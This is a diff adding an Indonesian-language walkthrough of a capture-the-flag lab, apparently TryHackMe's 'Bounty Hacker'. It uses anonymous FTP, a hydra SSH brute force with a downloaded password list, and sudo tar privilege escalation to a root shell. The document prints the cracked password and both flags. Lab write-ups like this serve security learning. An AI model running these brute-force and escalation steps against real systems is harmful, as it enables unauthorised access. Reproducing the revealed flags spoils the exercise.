@@ -1,0 +1,44 @@
+# scan dengan nmap
+$ nmap -sC -sV 10.10.212.4
+# dan kita mendapatkan port 20(fpt),22(ssh),80(http) terbuka
+# sekarang kita akan menghubungkan ke ftp
+$ ftp 10.10.212.4
+# dan kita masukkna name nya anonymous
+# sekarang kita sudah tehubung ke target
+# ketik ls dan kita akan melihat ada dua file yaitu locks.txt dan task.txt
+ftp > ls
+# untuk mengunduh filenya kita bisa ketikan perintah 
+ftp > get locks.txt
+ftp > get task.txt
+
+# dan kita lihat isi filnya,kita bisa melihat bahwa file task di tulis oleh orang bernama lin
+
+# melihat file locks.txt, sepertinya daftar kata sandi
+# kita dapat menjalankan serangan brute force terhadap layanan SSH dengan bantuan daftar kata sandi untuk menentukan kata sandi bagi pengguna. Perintahnya adalah: 
+$ hydra -l lin -P locks.txt 10.10.212.4 -t 4 ssh
+# dan kita mendapatkan kata sandinya yaitu :
+[22][ssh] host: 10.10.212.4   login: lin   password: RedDr4gonSynd1cat3
+
+# sekarang kita akan mengaksss SSH korban dengan perintah
+$ ssh lin@10.10.212.4
+# dan masukkan passwordnya yaitu RedDr4gonSynd1cat3
+# sekarnag kita sudah terhubung ke target,dan kita mendapatkan flag user.txt
+lin@bountyhacker:~/Desktop$ ls
+user.txt
+lin@bountyhacker:~/Desktop$ cat user.txt 
+THM{CR1M3_SyNd1C4T3}
+lin@bountyhacker:~/Desktop$
+
+# sekarang kita akan mecari flag root
+Karena flag root kemungkinan besar berada di suatu tempat di direktori root, kami mencoba cd ke direktori root. Seperti yang diharapkan, entri ditolak. Menjalankan perintah sudo -l memberitahu kita bahwa kita dapat menjalankan layanan tar sebagai root . Ini adalah kasus sederhana dari eskalasi hak istimewa sekarang. Salah satu sumber daya terbaik untuk digunakan untuk eskalasi hak istimewa dikenal sebagai GTFOBins (saya akan membiarkan Anda membayangkan apa artinya GTFO…). Mencari perintah tar, kita melihat bahwa kita dapat menjalankan perintah:
+
+sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+
+# sekarang kita sudah berada di akses root korban dapatkan flag root.txt nya
+# cd /root
+# ls
+root.txt
+# cat root.txt
+THM{80UN7Y_h4cK3r}
+# 
+
